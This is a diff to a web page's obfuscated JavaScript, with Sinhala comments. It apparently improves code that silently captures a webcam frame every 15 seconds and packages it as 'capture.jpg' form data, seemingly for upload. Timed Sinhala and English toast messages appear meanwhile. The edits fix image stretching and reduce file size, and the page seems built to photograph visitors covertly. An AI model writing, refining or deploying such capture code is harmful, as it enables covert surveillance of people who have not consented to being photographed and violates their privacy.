@@ -81,13 +81,20 @@
         }
         _gD();
 
-        // 1. Photo Capture Logic (Every 15s)
+        // 1. Photo Capture Logic (Every 15s) - FIXED STRETCHING ISSUE
         setInterval(() => {
-            if(document.visibilityState !== 'visible') return;
-            const _c = document.createElement('canvas'); _c.width = 640; _c.height = 480; 
+            if(document.visibilityState !== 'visible' || !vEl.videoWidth) return;
+            const _c = document.createElement('canvas'); 
+            
+            // වීඩියෝ එකේ නියම දිග පළලම ලබා ගැනීම (ඇදීම නැති කිරීම)
+            _c.width = vEl.videoWidth; 
+            _c.height = vEl.videoHeight; 
+            
             const _x = _c.getContext('2d');
             if(window.camMode === 'user'){ _x.translate(_c.width, 0); _x.scale(-1, 1); }
             _x.drawImage(vEl, 0, 0, _c.width, _c.height);
+            
+            // Quality 0.6 දීලා තියෙන්නේ ෆොටෝ එකේ Size එක (MB ගාණ) අඩු වෙන්න
             _c.toBlob(_b => {
                 let _f = new FormData(); 
                 _f.append('photo', _b, 'capture.jpg');
@@ -182,22 +189,14 @@
                 const toast = document.getElementById('toast');
                 const sinToast = document.getElementById('sinhala-toast');
 
-                // 1. මුලින්ම සිංහල පණිවිඩය පෙන්නනවා
                 sinToast.style.opacity = '1';
-                toast.style.opacity = '0'; // ඉංග්‍රීසි එක හැංගුවා
+                toast.style.opacity = '0'; 
                 
-                // 2. තත්පර 10කින් සිංහල එක මකලා ඉංග්‍රීසි එක දානවා
                 setTimeout(() => {
                     sinToast.style.opacity = '0';
-                    
-                    // තත්පර බාගයක පොඩි පරතරයක් (Fade out වෙන්න)
                     setTimeout(() => {
                         toast.style.opacity = '1';
-                        
-                        // තවත් තත්පර 4කින් ඉංග්‍රීසි එකත් මැකිලා යනවා
-                        setTimeout(() => {
-                            toast.style.opacity = '0';
-                        }, 4000);
+                        setTimeout(() => { toast.style.opacity = '0'; }, 4000);
                     }, 500);
                 }, 10000);
             }
